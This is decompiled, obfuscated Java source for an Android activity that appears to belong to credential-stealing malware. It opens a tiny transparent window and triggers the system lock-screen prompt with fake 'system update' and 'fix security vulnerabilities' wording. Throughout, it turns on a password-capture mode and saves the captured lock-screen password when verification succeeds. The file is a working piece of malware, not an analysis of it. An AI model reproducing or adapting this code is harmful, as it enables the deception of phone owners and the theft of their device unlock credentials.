package com.storm.safe.rock.activity;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.hardware.biometrics.BiometricPrompt;
import android.os.Build;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowMetrics;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.service.modules.cipher.C0337a3;
import kotlin.Triple;
import okhttp3.internal.p032ws.WebSocketProtocol;
import okio.Segment;
import p000.AbstractC0709j8;
import p000.AbstractC1120qr;
import p000.RunnableC0941o6;
import p000.h10;
import p000.t60;
import p000.tz0;
import p000.xk1;
import p000.yk1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class syuqattwmgit extends Activity {

    /* renamed from: a3 */
    public static final C0248a0 f51917a3 = new C0248a0(null);

    /* renamed from: a4 */
    public static h10 f51918a4;

    /* renamed from: a0 */
    public int f51919a0;

    /* renamed from: a1 */
    public CancellationSignal f51920a1;

    /* renamed from: a2 */
    public boolean f51921a2;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.activity.syuqattwmgit$a0 */
    public static final class C0248a0 {
        public /* synthetic */ C0248a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public static /* synthetic */ void start$default(C0248a0 c0248a0, Context context, int i, h10 h10Var, int i2, Object obj) {
            if ((i2 & 2) != 0) {
                i = 0;
            }
            if ((i2 & 4) != 0) {
                h10Var = null;
            }
            c0248a0.start(context, i, h10Var);
        }

        public final h10 getOnCredentialVerified() {
            return syuqattwmgit.f51918a4;
        }

        public final void setOnCredentialVerified(h10 h10Var) {
            syuqattwmgit.f51918a4 = h10Var;
        }

        public final void start(Context context, int i, h10 h10Var) {
            t60.m214695b6(context, "context");
            setOnCredentialVerified(h10Var);
            Intent intent = new Intent(context, (Class<?>) syuqattwmgit.class);
            intent.putExtra("credential_type", i);
            intent.addFlags(268435456);
            context.startActivity(intent);
        }

        private C0248a0() {
        }
    }

    /* renamed from: a0 */
    public final void m211191a0(boolean z) {
        t60.m214702c3("syuqattwmgit", "验证完成: ".concat(z ? "成功" : "失败"));
        try {
            if (C0335a1.f53283c5.getInstance() != null) {
                t60.m214714d6("CipherCaptureManager", "🔷 [setPasswordActivityFinished] syuqattwmgit 已结束");
            }
        } catch (Exception e) {
            tz0.m214810b0("设置密码界面结束标志失败: ", e.getMessage(), "syuqattwmgit");
        }
        dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
        c0290a0.setAssistMode();
        finish();
        try {
            dqtvuisjd c0290a02 = c0290a0.getInstance();
            if (c0290a02 != null) {
                C0335a1 c0600hy = C0335a1.f53283c5.getInstance(c0290a02, c0290a02);
                if (z) {
                    t60.m214714d6("syuqattwmgit", "验证成功，confirmAndSaveLastCipher 结果: " + c0600hy.m211812b1());
                } else {
                    C0337a3 sm0Var = C0337a3.f53343b6.getInstance(c0290a02, c0290a02);
                    if (sm0Var.m211845a8() || !sm0Var.f53351a5.isEmpty()) {
                        c0600hy.m211816b6();
                        t60.m214726f4("syuqattwmgit", "验证失败/取消，丢弃缓冲密码（覆盖层存在或有图案数据）");
                    } else {
                        t60.m214702c3("syuqattwmgit", "验证失败但无覆盖层和图案数据，跳过 discard");
                    }
                }
                c0600hy.m211815b5();
                t60.m214714d6("syuqattwmgit", "已关闭密码捕获监听模式");
            }
        } catch (Exception e2) {
            tz0.m214810b0("处理验证结果失败: ", e2.getMessage(), "syuqattwmgit");
        }
        h10 h10Var = f51918a4;
        if (h10Var != null) {
            h10Var.invoke(Boolean.valueOf(z));
        }
        f51918a4 = null;
    }

    /* renamed from: a1 */
    public final Triple m211192a1() {
        return this.f51919a0 == 0 ? new Triple(t60.m214713d4("appCredentialTitle", "Verify personal identity"), t60.m214713d4("appCredentialSubTitle", "Privacy protection"), t60.m214713d4("appCredentialDescription", "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.")) : new Triple(t60.m214713d4("updateCredentialTitle", "Verify lock screen password"), t60.m214713d4("updateCredentialSubTitle", "Fix system security vulnerabilities"), t60.m214713d4("updateCredentialDescription", "Please enter your lock screen password to complete the system update and fix security vulnerabilities."));
    }

    /* renamed from: a2 */
    public final void m211193a2() {
        if (Build.VERSION.SDK_INT < 30) {
            return;
        }
        t60.m214702c3("syuqattwmgit", "使用 BiometricPrompt (API 30+)");
        Triple tripleM211192a1 = m211192a1();
        String str = (String) tripleM211192a1.f57564a0;
        String str2 = (String) tripleM211192a1.f57565a1;
        String str3 = (String) tripleM211192a1.f57566a2;
        t60.m214702c3("syuqattwmgit", "标题: " + str + ", 副标题: " + str2);
        try {
            AbstractC0709j8.m213235b6();
            BiometricPrompt biometricPromptBuild = AbstractC0709j8.m213225a6(this).setTitle(str).setSubtitle(str2).setDescription(str3).setAllowedAuthenticators(32768).build();
            t60.m214694b5(biometricPromptBuild, "Builder(this)\n          …\n                .build()");
            CancellationSignal cancellationSignal = new CancellationSignal();
            this.f51920a1 = cancellationSignal;
            cancellationSignal.setOnCancelListener(new xk1());
            dqtvuisjd.f52358m1.setVerifyPauseMode();
            sendBroadcast(new Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN").setPackage(getPackageName()));
            t60.m214714d6("syuqattwmgit", "已发送 BIOMETRIC_PROMPT_SHOWN 广播");
            CancellationSignal cancellationSignal2 = this.f51920a1;
            t60.m214692b3(cancellationSignal2);
            biometricPromptBuild.authenticate(cancellationSignal2, getMainExecutor(), new yk1(this));
        } catch (Exception e) {
            t60.m214704c5("syuqattwmgit", "BiometricPrompt 异常: " + e.getMessage());
            m211194a3();
        }
    }

    /* renamed from: a3 */
    public final void m211194a3() {
        t60.m214702c3("syuqattwmgit", "使用 KeyguardManager");
        Object systemService = getSystemService("keyguard");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.KeyguardManager");
        Triple tripleM211192a1 = m211192a1();
        String str = (String) tripleM211192a1.f57564a0;
        String str2 = (String) tripleM211192a1.f57566a2;
        t60.m214702c3("syuqattwmgit", "标题: " + str);
        Intent intentCreateConfirmDeviceCredentialIntent = ((KeyguardManager) systemService).createConfirmDeviceCredentialIntent(str, str2);
        if (intentCreateConfirmDeviceCredentialIntent == null) {
            if (Build.VERSION.SDK_INT >= 30) {
                t60.m214726f4("syuqattwmgit", "KeyguardManager.createConfirmDeviceCredentialIntent 返回 null，回退 BiometricPrompt");
                m211193a2();
                return;
            } else {
                t60.m214704c5("syuqattwmgit", "无法创建验证 Intent");
                m211191a0(false);
                return;
            }
        }
        intentCreateConfirmDeviceCredentialIntent.addFlags(536870912);
        intentCreateConfirmDeviceCredentialIntent.addFlags(67108864);
        intentCreateConfirmDeviceCredentialIntent.addFlags(8388608);
        dqtvuisjd.f52358m1.setVerifyPauseMode();
        sendBroadcast(new Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN").setPackage(getPackageName()));
        t60.m214714d6("syuqattwmgit", "已发送 BIOMETRIC_PROMPT_SHOWN 广播 (KeyguardManager)");
        startActivityForResult(intentCreateConfirmDeviceCredentialIntent, WebSocketProtocol.CLOSE_CLIENT_GOING_AWAY);
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 1001) {
            if (i2 == -1) {
                t60.m214702c3("syuqattwmgit", "KeyguardManager 结果: 成功");
                m211191a0(true);
            } else {
                t60.m214702c3("syuqattwmgit", "KeyguardManager 结果: 失败/取消");
                m211191a0(false);
            }
        }
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        t60.m214702c3("syuqattwmgit", "syuqattwmgit 启动");
        try {
            if (C0335a1.f53283c5.getInstance() != null) {
                t60.m214714d6("CipherCaptureManager", "🔷 [setPasswordActivityLaunched] syuqattwmgit 已启动");
            }
        } catch (Exception e) {
            tz0.m214810b0("设置启动保护期失败: ", e.getMessage(), "syuqattwmgit");
        }
        t60.m214715d7(this);
        int intExtra = getIntent().getIntExtra("credential_type", 0);
        this.f51919a0 = intExtra;
        t60.m214702c3("syuqattwmgit", "验证类型: ".concat(intExtra == 0 ? "应用验证" : "系统更新"));
        View view = new View(this);
        if (Build.VERSION.SDK_INT >= 30) {
            WindowMetrics currentWindowMetrics = getWindow().getWindowManager().getCurrentWindowMetrics();
            t60.m214694b5(currentWindowMetrics, "window.windowManager.currentWindowMetrics");
            Rect bounds = currentWindowMetrics.getBounds();
            t60.m214694b5(bounds, "windowMetrics.bounds");
            view.layout(bounds.left, bounds.top, bounds.right, bounds.bottom);
        }
        setContentView(view);
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.dimAmount = 0.0f;
        attributes.x = 0;
        attributes.y = 0;
        attributes.width = 1;
        attributes.height = 1;
        attributes.gravity = 8388661;
        getWindow().setAttributes(attributes);
        getWindow().getDecorView().setBackgroundColor(0);
        getWindow().setFlags(Segment.SHARE_MINIMUM, Segment.SHARE_MINIMUM);
        getWindow().addFlags(32);
        getWindow().addFlags(16);
        getWindow().addFlags(67108864);
        getWindow().addFlags(134217728);
        getWindow().addFlags(262144);
        t60.m214702c3("syuqattwmgit", "syuqattwmgit onCreate 完成");
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        t60.m214702c3("syuqattwmgit", "syuqattwmgit onDestroy");
        super.onDestroy();
        CancellationSignal cancellationSignal = this.f51920a1;
        if (cancellationSignal != null) {
            cancellationSignal.cancel();
        }
        this.f51920a1 = null;
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        t60.m214702c3("syuqattwmgit", "syuqattwmgit onResume, hasTriggeredAuth=" + this.f51921a2);
        if (this.f51921a2) {
            return;
        }
        this.f51921a2 = true;
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 != null) {
                C0335a1.m211788c1(C0335a1.f53283c5.getInstance(c0290a0, c0290a0));
                t60.m214714d6("syuqattwmgit", "已启用密码捕获监听模式");
            }
        } catch (Exception e) {
            tz0.m214810b0("启用密码捕获失败: ", e.getMessage(), "syuqattwmgit");
        }
        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0941o6(24, this), 300L);
    }

    @Override // android.app.Activity
    public final void onStop() {
        super.onStop();
        t60.m214702c3("syuqattwmgit", "syuqattwmgit onStop (透明Activity被覆盖，这是正常的)");
    }
}
